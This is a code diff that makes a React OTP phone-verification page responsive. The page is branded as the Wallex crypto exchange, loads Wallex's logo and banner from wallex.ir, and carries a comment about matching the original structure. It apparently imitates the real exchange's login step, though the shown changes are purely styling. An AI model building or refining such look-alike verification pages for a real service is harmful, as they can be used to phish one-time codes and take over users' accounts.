@@ -78,39 +78,41 @@ const PhoneVerification = () => {
   };
 
   return (
-    <div className="flex h-screen bg-[#0e2342]">
+    <div className="flex min-h-screen bg-[#0e2342]">
       {/* Main Content */}
-      <div className="flex items-center justify-evenly w-full h-full">
+      <div className="flex flex-col lg:flex-row items-center justify-center lg:justify-evenly w-full min-h-screen p-4 lg:p-0">
         {/* Verification Form Section */}
-        <div className="flex items-center justify-center">
-          <div className="bg-white rounded-2xl">
-            <div className="flex flex-col gap-2 p-5 w-[480px]">
+        <div className="flex items-center justify-center w-full lg:w-auto">
+          <div className="bg-white rounded-2xl w-full max-w-md lg:max-w-[480px] mx-auto">
+            <div className="flex flex-col gap-2 p-4 sm:p-5 lg:p-5">
               {/* Header */}
               <div className="flex justify-between items-center w-full">
-                <div className="flex items-start gap-2">
+                <div className="flex items-center gap-2">
                   <Button
                     variant="ghost"
                     size="icon"
                     onClick={handleEditNumber}
-                    className="rounded-full border-0 text-gray-600 hover:bg-gray-100"
+                    className="rounded-full border-0 text-gray-600 hover:bg-gray-100 flex-shrink-0"
                   >
-                    <ChevronLeft className="h-6 w-6" />
+                    <ChevronLeft className="h-5 w-5 sm:h-6 sm:w-6" />
                   </Button>
-                  <span className="font-bold">تائید شماره همراه</span>
+                  <span className="font-bold text-sm sm:text-base">
+                    تائید شماره همراه
+                  </span>
                 </div>
-                <a href="#" className="flex items-center">
+                <a href="#" className="flex items-center flex-shrink-0">
                   <img
                     src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
                     alt="صرافی خرید فروش ارزهای دیجیتال"
                     width={128}
                     height={24}
-                    className="h-6 w-32 object-contain"
+                    className="h-5 w-24 sm:h-6 sm:w-32 object-contain"
                   />
                 </a>
               </div>
 
               {/* Separator */}
-              <hr className="border-gray-200 -mx-5 my-2" />
+              <hr className="border-gray-200 -mx-4 sm:-mx-5 my-2" />
 
               {/* Content */}
               <div className="flex flex-col gap-2 mt-4">
@@ -124,7 +126,7 @@ const PhoneVerification = () => {
                 </AlertMessage>
 
                 {/* OTP Input Section */}
-                <div className="my-6">
+                <div className="my-4 sm:my-6">
                   <OTPInput
                     length={6}
                     value={otp}
@@ -140,7 +142,6 @@ const PhoneVerification = () => {
                     </p>
                   )}
                 </div>
-
                 {/* Countdown Timer */}
                 <div className="text-center">
                   <p className="text-gray-600 text-sm py-1">
@@ -162,13 +163,13 @@ const PhoneVerification = () => {
 
                 {/* Action Buttons */}
                 <div className="mt-4">
-                  <hr className="border-gray-200 -mx-5 mb-4" />
-                  <div className="flex gap-3">
+                  <hr className="border-gray-200 -mx-4 sm:-mx-5 mb-4" />
+                  <div className="flex flex-col sm:flex-row gap-3">
                     <Button
                       type="button"
                       variant="outline"
                       onClick={handleEditNumber}
-                      className="w-full border border-gray-300 text-gray-600 rounded-lg py-2 px-4 font-medium uppercase hover:bg-gray-50"
+                      className="w-full border border-gray-300 text-gray-600 rounded-lg py-2.5 sm:py-2 px-4 font-medium text-xs sm:text-sm uppercase hover:bg-gray-50"
                     >
                       ویرایش شماره
                     </Button>
@@ -176,12 +177,14 @@ const PhoneVerification = () => {
                       type="button"
                       onClick={handleSubmit}
                       disabled={isSubmitting || otp.length !== 6}
-                      className="w-full bg-gray-800 hover:bg-gray-900 text-white rounded-lg py-2 px-4 font-medium uppercase disabled:opacity-50 disabled:cursor-not-allowed"
+                      className="w-full bg-gray-800 hover:bg-gray-900 text-white rounded-lg py-2.5 sm:py-2 px-4 font-medium text-xs sm:text-sm uppercase disabled:opacity-50 disabled:cursor-not-allowed"
                     >
                       {isSubmitting ? (
                         <div className="flex items-center justify-center">
-                          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2" />
-                          در حال بررسی...
+                          <div className="animate-spin rounded-full h-3 w-3 sm:h-4 sm:w-4 border-b-2 border-white mr-2" />
+                          <span className="text-xs sm:text-sm">
+                            در حال بررسی...
+                          </span>
                         </div>
                       ) : (
                         "ثبت و ادامه"
@@ -195,11 +198,11 @@ const PhoneVerification = () => {
         </div>
 
         {/* Background Image Section */}
-        <div className="h-full max-w-[720px] w-full overflow-hidden relative hidden lg:block">
+        <div className="hidden lg:flex lg:items-center lg:justify-center lg:flex-1 lg:h-full lg:max-w-[720px] lg:w-full overflow-hidden relative">
           <img
             src="https://wallex.ir/rhino/wallex-public/banners/puv2vWcovprVkKayXiPwuM2uSeJ39mLtZXY0ZLNf.png?w=3840&q=90"
             alt="رتبه یک حجم معاملات بیت‌کوین"
-            className="absolute inset-0 w-full h-full object-contain"
+            className="w-full h-auto max-h-[600px] object-contain"
             loading="lazy"
             decoding="async"
           />
@@ -213,13 +216,14 @@ const PhoneVerification = () => {
 
       {/* Support Button */}
       <Button
-        className="fixed bottom-4 left-4 bg-blue-500 hover:bg-blue-600 text-white rounded-lg px-4 py-1 text-sm font-medium uppercase shadow-lg z-[1050] flex items-center transition-all duration-250"
+        className="fixed bottom-4 left-4 bg-blue-500 hover:bg-blue-600 text-white rounded-lg px-3 sm:px-4 py-1 text-xs sm:text-sm font-medium uppercase shadow-lg z-[1050] flex items-center transition-all duration-250"
         type="button"
       >
         <span className="flex ml-1 -mr-2">
-          <MessageSquare className="h-5 w-5 mr-2" />
+          <MessageSquare className="h-4 w-4 sm:h-5 sm:w-5 mr-1 sm:mr-2" />
         </span>
-        <span>پشتیبانی والکس</span>
+        <span className="hidden sm:inline">پشتیبانی والکس</span>
+        <span className="sm:hidden">پشتیبانی</span>
       </Button>
 
       {/* Hidden Elements (matching original structure) */}
